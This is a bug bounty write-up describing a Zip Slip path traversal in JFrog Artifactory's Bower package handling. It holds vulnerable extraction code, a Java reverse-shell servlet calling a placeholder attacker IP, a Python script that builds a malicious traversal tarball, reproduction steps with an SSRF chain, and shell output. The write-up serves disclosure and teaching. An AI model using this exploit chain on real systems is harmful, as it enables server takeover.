---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2024-06-23_zip-slip-meets-artifactory-a-bug-bounty-story.md
original_filename: 2024-06-23_zip-slip-meets-artifactory-a-bug-bounty-story.md
title: 'Zip Slip meets Artifactory: A Bug Bounty Story'
category: documents
detected_topics:
- path-traversal
- supply-chain
- command-injection
- idor
- ssrf
- file-upload
tags:
- imported
- documents
- path-traversal
- supply-chain
- command-injection
- idor
- ssrf
- file-upload
language: en
raw_sha256: 0daae61b0c8a72b0903105ae881c6a2ff98305cd43f8c5e9d7109faa73cdd73b
text_sha256: 16de0bc233f618f530659e67e81b49a868b742bfcbf4aa8364ef7441c05c3b49
ingested_at: '2026-06-28T07:32:34Z'
sensitivity: unknown
redactions_applied: false
---

# Zip Slip meets Artifactory: A Bug Bounty Story

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2024-06-23_zip-slip-meets-artifactory-a-bug-bounty-story.md
- Source Type: markdown
- Detected Topics: path-traversal, supply-chain, command-injection, idor, ssrf, file-upload
- Ingested At: 2026-06-28T07:32:34Z
- Redactions Applied: False
- Raw SHA256: `0daae61b0c8a72b0903105ae881c6a2ff98305cd43f8c5e9d7109faa73cdd73b`
- Text SHA256: `16de0bc233f618f530659e67e81b49a868b742bfcbf4aa8364ef7441c05c3b49`


## Content

---
title: "Zip Slip meets Artifactory: A Bug Bounty Story"
page_title: "Zip Slip meets Artifactory: A Bug Bounty Story | Karma(In)Security"
url: "https://karmainsecurity.com/zip-slip-meets-artifactory-a-bug-bounty-story"
final_url: "https://karmainsecurity.com/zip-slip-meets-artifactory-a-bug-bounty-story"
authors: ["Egidio Romano"]
programs: ["JFrog (Artifactory)"]
bugs: ["Zip Slip attack", "Path traversal", "Security code review"]
bounty: "5,000"
publication_date: "2024-06-23"
added_date: "2024-07-01"
source: "pentester.land/writeups.json"
original_index: 233
---

# Zip Slip meets Artifactory: A Bug Bounty Story

published
  June 23, 2024
reading time
  13 minutes

[Artifactory](https://jfrog.com/artifactory/), developed by JFrog, is an industry-leading software repository manager, a single solution for storing and managing all the artifacts, binaries, packages, files, containers, and components for use throughout the software supply chain. JFrog Artifactory serves as a central hub for [DevOps](https://en.wikipedia.org/wiki/DevOps), integrating with software development tools and processes.

In this blog post I’m going to tell a story about a Zip Slip vulnerability in Artifactory I reported to the JFrog private Bug Bounty Program in early 2021, a security bug for which I got a bounty of **USD 5000$** and some cool swags!

Last week I also had the chance to publicly talk about this story at [hackmeeting 0x1B](https://hackmeeting.org/hackit24/), with a presentation titled _**Attacchi Zip Slip: storia di un exploit in “archivio” (Zip Slip Attacks: story of an exploit in “archive”)**_ … [Here](https://docs.google.com/presentation/d/11_M7gXBnYJUUeh_9JO0nmyhzwuvlddMsJzfmKtFUyog) you can find the slides used in my talk.

![](/img/hackmeeting.png)

Before moving forward to this story, let’s have some context, and try to find out what is a Path Traversal vulnerability. Since a Zip Slip, in a nutshell, is an arbitrary file write vulnerability which can be exploited through Path Traversal attacks that might occur in the context of processing/extraction of an archive file, such as a Zip or Tar archive. If you’re already familiar with Path Traversal attacks you can also skip the next section.

#### • Path Traversal Vulnerabilities

A [Path Traversal](https://en.wikipedia.org/wiki/Directory_traversal_attack) (or Directory Traversal) attack exploits an insufficient input validation of user-supplied file names, such that characters representing “traverse to parent directory” - so called dot-dot-slash (../) sequences - are passed through to the operating system’s file system API. A vulnerable application might be exploited by attackers to gain unauthorized access to the file system, allowing them to read or write arbitrary files on the system.

Indeed, an application can be vulnerable to Path Traversal attacks both in reading and writing mode, leading to arbitrary file read primitives in the first case, which might introduce [Information Disclosure](https://portswigger.net/web-security/information-disclosure) attack vectors, and arbitrary file write primitives in the second case, which in turn might lead to Remote Code Execution ([RCE](https://en.wikipedia.org/wiki/Arbitrary_code_execution)) attacks. That’s the reason why the second case is the most interesting one, and Zip Slip attacks work in writing mode, which means they can often lead to Remote Code Execution (RCE)!

Following is an example of PHP application vulnerable to Path Traversal, in reading mode:
  
  
  1<?php
  2
  3// some PHP code
  4
  5if (isset($_GET['filename']))
  6  $image = $_GET['filename'];
  7else
  8  $image = 'default.png';
  9
  10readfile('/var/www/images/' . $image);
  11
  12// some more PHP code
  13
  14?>
  

In this example, due to a missing input validation of the **“filename”** GET parameter (which is assigned to the `$image` variable at line 6), an attacker might be able to read arbitrary files on the vulnerable web server by using dot-dot-slash (../) sequences to e.g. reach to the root path (`/`) and retrieve the content of the password file (`/etc/passwd`), something like this:

![](/img/directory-traversal.svg)

Here is another example of vulnerable Java web application, this time in writing mode:
  
  
  1@PostMapping("/uploadimage")
  2public String uploadImage(Model model, @RequestParam("image") MultipartFile file) throws IOException
  3{
  4  var name = file.getOriginalFilename().replace(" ", "_");
  5  var fileNameAndPath = Paths.get(UPLOAD_DIRECTORY, name);
  6  Files.write(fileNameAndPath, file.getBytes());
  7
  8  // some more Java code
  9
  10  return "/user/upload";
  11}

In this case, due to an improper input validation of the submitted “filename” (which is assigned to the `name` variable at line 4, and this is later used at line 6 to write the uploaded file), an attacker might be able to upload/write arbitrary files anywhere on the web server, even outside of the destination directory (the `UPLOAD_DIRECTORY` constant in this example), using dot-dot-slash (../) sequences within the uploaded filename by e.g. tampering the upload HTTP request with a proxy tool. Something like this:

![](/img/upload-path-traversal.png)

This, in turn, might lead to Remote Code Execution (RCE) attacks by e.g. creating new malicious [JSP](https://en.wikipedia.org/wiki/Jakarta_Server_Pages) files inside the server’s webroot folder, and remotely executing them by invoking the same through HTTP requests. Another possible attack vector would be to write/overwrite the user’s SSH private key (i.e. `/home/user/.ssh/id_rsa`), and gain unauthorized access to the web server through SSH, if exposed. In other words, there could be a number of ways to get Remote Code Execution (RCE) from an arbitrary file write primitive, and they all depend on the context, as we will see shortly.

#### • Zip Slip Vulnerabilities

Zip Slip is a class of vulnerabilities more than thirty years old, probably “born” in 1991 with an article published on [Phrack](http://www.phrack.org/issues/34/5.html#article):

> *** Technique #3: The -D Archive Hack
> 
> This technique also plays on the openness of WWIV’s archive system. This is another method of getting a file into the root BBS directory, or anywhere on the hard drive, for that matter.
> 
> First, create a temporary directory on your hard drive. It doesn’t matter what it’s called. We’ll call it TEMP. Then, make a sub-directory of TEMP called AA. It can actually be called any two-character combination, but we’ll keep it nice and simple. Then make a subdirectory of AA called WWIV.
> 
> Place NETWORK.COM or REMOTE.COM or whatever in the directory \TEMP\AA\WWIV. Then from the TEMP directory execute the command:
>  
>  
>  PKZIP -r -P STUFF.ZIP  <--- The case of "r" and "P" are important.
>  
> 
> This will create a zip file of all the contents of the directories, but with all of the directory names recursed and stored. So if you do a PKZIP -V to list the files you should see AA\WWIV\REMOTE.COM, etc.
> 
> Next, load STUFF.ZIP into a hex editor, like Norton Utilities, and search for “AA”. When you find it (it should occur twice), change it to “C:”. It is probably a good idea to do this twice, once with the subdirectory called WWIV, and another with it called BBS, since those are the two most common main BBS directory names for WWIV. You may even want to try D: or E: in addition to C:. You could even work backwards, by forgetting the WWIV subdirectory, and just making it AA\REMOTE.COM, and changing the “AA” to “..”. This would be foolproof. You could work from there, doing “..\\..\DOS\PKZIP.COM” or whatever.
> 
> Then upload STUFF.ZIP (or whatever you want to call it) to the BBS, and type “E” to extract it to a temporary directory. It’ll ask you what file. Type “STUFF.ZIP”. It’ll ask what you want to extract. Type “""-D”. It’ll then execute:
>  
>  
>  PKUNZIP STUFF.ZIP ""-D
>  
> 
> It will unzip everything into the proper directory. Voila.

So, basically the concept of putting dot-dot-slash (../) sequences inside an archive file, and therefore exploit applications vulnerable to Path Traversal attacks in this way, has been firstly introduced in September 1991 with regards to [BBS](https://en.wikipedia.org/wiki/Bulletin_board_system) hacking, when the Web was just born a month before… However, it looks like it took some years before applying this technique to the Web context, and this likely happened in 2006, with [CVE-2006-0931](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0931) and [CVE-2006-0932](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-0932) \- which are the oldest Web related Zip Slip vulnerabilities I can see on [these](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=traversal+zip) [lists](https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=traversal+tar). Three years later, in April 2009, there was also a study published by [Neohapsis](https://web.archive.org/web/20091010103946/https://labs.neohapsis.com/2009/04/21/directory-traversal-in-archives/). After some more years of “almost silence” about it, in 2018 Snyk published [a research](https://security.snyk.io/research/zip-slip-vulnerability) which “renamed” this class of vulnerabilities with the actual known name, and made Snyk collecting dozens of CVEs by discovering and reporting Zip Slip vulnerabilities in several software products.

Let’s see an example of vulnerable Java code:
  
  
  1public void extractZipFile(ZipFile zip, String destinationDir)
  2{
  3  Enumeration<ZipEntry> entries = zip.getEntries(); 
  4  while (entries.hasMoreElements())
  5  { 
  6  ZipEntry e = entries.nextElement(); 
  7  File f = new File(destinationDir, e.getName()); 
  8  InputStream input = zip.getInputStream(e); 
  9  IOUtils.copy(input, write(f)); 
  10  }
  11}

As you can see, at line 7 the entry name (filename) within the Zip archive - or rather, the value returned by the call to `e.getName()` \- is concatenated with the destination directory, without being validated, and this is later used at line 9 to actually write/extract the file from the archive. As such, this might be exploited by providing a specially crafted Zip archive which contains dot-dot-slash (../) sequences within its entry filenames, leading to an arbitrary file write primitive via Path Traversal attacks.

#### • Zip Slip Vulnerability in JFrog Artifactory <= 7.12.10

It all began on December 28, 2020, when I received an invitation for a [HackerOne](https://www.hackerone.com/) private program by JFrog. I was very glad for that, and immediately got intrigued by Artifactory… So, I downloaded it, installed it, and started testing and doing reverse engineering of its Java source code. As a result, I discovered a few nice security bugs affecting Artifactory, but here I’m going to detail only one of them, probably the most interesting one (seeing it took me some days of hard work to actually exploit it). It’s about a Zip Slip vulnerability located in the `org.artifactory.addon.bower.helpers.BowerExternalDependenciesHandler` class:
  
  
  110  private List<File> extractBowerPackage() throws IOException, ArchiveException {
  111  log.debug("Extracting archive contents of bower package {} for dependency rewrite on repo {}", this.resource
  112  .getRepoPath(), this.repo.getKey());
  113  ResourceStreamHandle handle = this.repoService.getResourceStreamHandle(this.resource.getRepoPath());
  114  List<File> archiveContents = new ArrayList<>();
  115  ArchiveInputStream stream = (new ArchiveStreamFactory()).createArchiveInputStream(new BufferedInputStream(new GZIPInputStream(handle.getInputStream())));
  116  try {
  117  ArchiveEntry entry;
  118  while ((entry = stream.getNextEntry()) != null) {
  119  if (!entry.isDirectory() && !entry.getName().contains("pax_global_header")) {
  120  File outputFile = copyEntryToFile(stream, entry);
  121  archiveContents.add(outputFile);
  122  } 
  123  } 
  124  if (stream != null)
  125  stream.close(); 
  126  } catch (Throwable throwable) {
  127  if (stream != null)
  128  try {
  129  stream.close();
  130  } catch (Throwable throwable1) {
  131  throwable.addSuppressed(throwable1);
  132  }  
  133  throw throwable;
  134  } 
  135  if (log.isTraceEnabled())
  136  log.trace("Archive contents for bower package at {} are: {}", this.resource.getRepoPath(), 
  137  Arrays.toString(archiveContents.toArray())); 
  138  return archiveContents;
  139  }
  140  
  141  private File copyEntryToFile(ArchiveInputStream stream, ArchiveEntry entry) throws IOException {
  142  File outputFile = new File(this.tempBowerDirectory, entry.getName());
  143  Files.createDirectories(outputFile.toPath().getParent(), (FileAttribute<?>[])new FileAttribute[0]);
  144  OutputStream os = new FileOutputStream(outputFile);
  145  IOUtils.copy((InputStream)stream, os);
  146  os.close();
  147  return outputFile;
  148  }

The `extractBowerPackage()` method is called when handling “[external dependencies rewrite](https://jfrog.com/help/r/jfrog-artifactory-documentation/automatically-rewrite-external-dependencies)” of [Bower](https://bower.io/) packages, and this in turn will call the vulnerable `copyEntryToFile()` method at line 120 for each entry within the Bower package (which is expected to be a .tar.gz file). At line 142, this method uses the entry name (filename) provided within the user-tainted Bower archive - or rather, the value returned by the call to `entry.getName()` \- for concatenation with a temporary directory to create a new `File` object, without proper validation. Such a `File` object is later used at lines 144-145 to actually extract the file from the package and write it on the file system. This can be exploited to write (or overwrite) arbitrary files on the remote web server by providing a malicious Bower package containing dot-dot-slash (../) sequences within its entry filenames, resulting in Remote Code Execution (RCE) attacks by e.g. creating a new [WAR](https://en.wikipedia.org/wiki/WAR_\(file_format\)) file inside the Tomcat `webapps` directory, which will be [automatically deployed](https://github.com/gquere/CVE-2020-7931?tab=readme-ov-file#starting-a-tomcat-servlet-deploying-a-war-file) as a new Tomcat web application after a few seconds:

> WAR files have to be placed in Tomcat webapps path /opt/jfrog/artifactory/tomcat/webapps/. By default, deployment of WAR files is automatic and will start another web application next to the Artifactory instance, e.g. at http://localhost:8081/sample/.

Following are the steps to create a specially crafted Bower package to exploit this Zip Slip vulnerability:

  * Create a `ShellServlet.java` file containing your (reverse) shell code, something like this:

  
  
  1import java.io.*;
  2import java.net.Socket;
  3import javax.servlet.*;
  4import javax.servlet.http.*;
  5import javax.servlet.annotation.*;
  6
  7@WebServlet("/")
  8public class ShellServlet extends HttpServlet {
  9
  10  @Override
  11  public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
  12
  13  String host = "[ATTACKER_IP_ADDRESS]";
  14  int port = 12345;
  15  String cmd = "/bin/sh";
  16  
  17  Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
  18  Socket s = new Socket(host, port);
  19  InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
  20  OutputStream po = p.getOutputStream(), so = s.getOutputStream();
  21  
  22  while(!s.isClosed()) {
  23
  24  while(pi.available() > 0)
  25  so.write(pi.read());
  26  while(pe.available() > 0)
  27  so.write(pe.read());
  28  while(si.available() > 0)
  29  po.write(si.read());
  30  
  31  so.flush();
  32  po.flush();
  33  
  34  try {
  35  Thread.sleep(50);
  36  p.exitValue();
  37  break;
  38  }
  39  catch (Exception e) {
  40  }
  41  }
  42  
  43  p.destroy();
  44  s.close();
  45  }
  46}

  * Place this file inside the following directory structure: `rce/WEB-INF/classes/ShellServlet.java`
  * Compile the servlet with the following command: `javac -cp servlet-api.jar rce/WEB-INF/classes/ShellServlet.java`
  * Create the WAR file with the following command: `cd rce; jar -cvf ../rce.war WEB-INF/classes/*.class; cd ..`
  * Create the `rce.tar.gz` Bower package by running the following Python script:

  
  
  1#!/usr/bin/env python
  2
  3import sys, tarfile
  4
  5fname = "rce.tar.gz"
  6zpath = "../../../../../../../../../../../../../opt/jfrog/artifactory/app/artifactory/tomcat/webapps/rce.war"
  7
  8print "Creating " + fname + " containing " + zpath
  9
  10tf = tarfile.open(fname, "w:gz")
  11tf.add("rce.war", zpath)
  12tf.add("bower.json")
  13tf.close()

  * Where the `bower.json` file contains an “external dependency” like this:

  
  
  1{
  2  "dependencies": {
  3  "test": "https://github.com/owner/package.git#branch"
  4  }
  5}

Once you created the `rce.tar.gz` file, you can reproduce the vulnerability with the following steps:

  * Login as an admin user into Artifactory
  * Create a new Bower Local Repository (`bower-local`)
  * Create a new Bower Remote Repository (`bower-remote`)
  * Create a new Bower Virtual Repository: select both `bower-local` and `bower-remote` under “Repositories”, select `bower-local` under “Default Deployment Repository”, then click on the “Advanced” tab and select “Enable Dependency Rewrite”
  * Go to “Artifactory” → “Artifacts”, select the Bower Virtual Repository and deploy the `rce.tar.gz` file
  * Download the deployed artifact and the vulnerability will be triggered, writing the `rce.war` file inside the Tomcat `webapps` directory, which will be automatically deployed as a new Tomcat web application
  * Now, in order the execute the malicious WAR the attacker should access to `http://[artifactory_instance]:8081/rce/`, but this was not possible on JFrog Cloud because port 8081 was not open to the Internet. However, by “chaining” other ([SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)) vulnerabilities, it was still possible to execute the WAR also on JFrog Cloud: just create a new Generic Remote Repository, and put the string `http://0.0.0.0:8081/rce` in the URL text box, click on “Test” and the (reverse) shell will be executed

**NOTE** : even though creation of the Bower repositories requires an admin account, this doesn’t necessarily mean that successful exploitation of this vulnerability requires an admin account. It could also be exploited by non-admin users with permissions to deploy artifacts in a Bower Virtual Repository with the “Enable Dependency Rewrite” option enabled.

Here’s the Proof of Concept (PoC) video I sent along with the HackerOne report:

Your browser does not support the video tag. 

While [here](/pocs/artifactory_rce.zip) you can find a full working Proof of Concept (PoC) script to reproduce this vulnerability. It’s a PHP script supposed to be used from the command line (CLI), and you should see an output like the following:
  
  
  $ php rce.php https://egix2hackerone.jfrog.io/ admin ********
  [-] Logging in with username 'admin' and password '********'
  [-] Creating Bower Local Repository...
  [-] Creating Bower Remote Repository...
  [-] Creating Bower Virtual Repository...
  [-] Uploading malicious Bower package...
  [-] Deploying package to 'bower-1611601753'...
  [-] Downloading package to trigger the vulnerability...
  [-] Deleting Bower Repositories...
  [-] Waiting for the shell to be deployed...
  
  jfrog-shell# id
  uid=1030(artifactory) gid=1030(artifactory) groups=1030(artifactory),40019,40030
  
  jfrog-shell# uname -a
  Linux a0efcqstryncc-artifactory-primary-0 4.14.203-156.332.amzn2.x86_64 #1 SMP Fri Oct 30 19:19:33 UTC 2020 x86_64 GNU/Linux
  

I reported this vulnerability on January 24, 2021, and it was confirmed by the HackerOne triage team on January 29, 2021. In the end, I got a bounty of **USD 5000$** on February 1, 2021! In addition to that, I also received some cool swags including this nice t-shirt:

![](/img/jfrog-t-shirt.jpg)

### Conclusion

Wrapping up, you may say Zip Slip is a class of vulnerabilities which has been around for a long time, and will most likely exist for a long time to come. Like in 99% of cases, security bugs like these arise from human errors, as a result of forgetfulness or false assumptions. Zip Slip is nothing more than that: exploiting a Path Traversal vulnerability to write arbitrary files inside unexpected folders, taking advantage of developers' lack of control. As we have seen in this story, this might be exploited by attackers to take complete control of machines running an application vulnerable to Zip Slip attacks.

Finally, I’d like to say one more time thank you [JFrog](https://jfrog.com), for giving me the chance to participate to your private Bug Bounty Program, for the bounty received, and all the rest… 🐸 Also, I’d like to say thanks to the Italian [hackmeeting](https://hackmeeting.org) community, for giving me the opportunity of publicly disclosing and talking about this Zip Slip vulnerability for the first time! By the way, this was my first ever hackmeeting event, and it was a really nice experience for me! ❤️
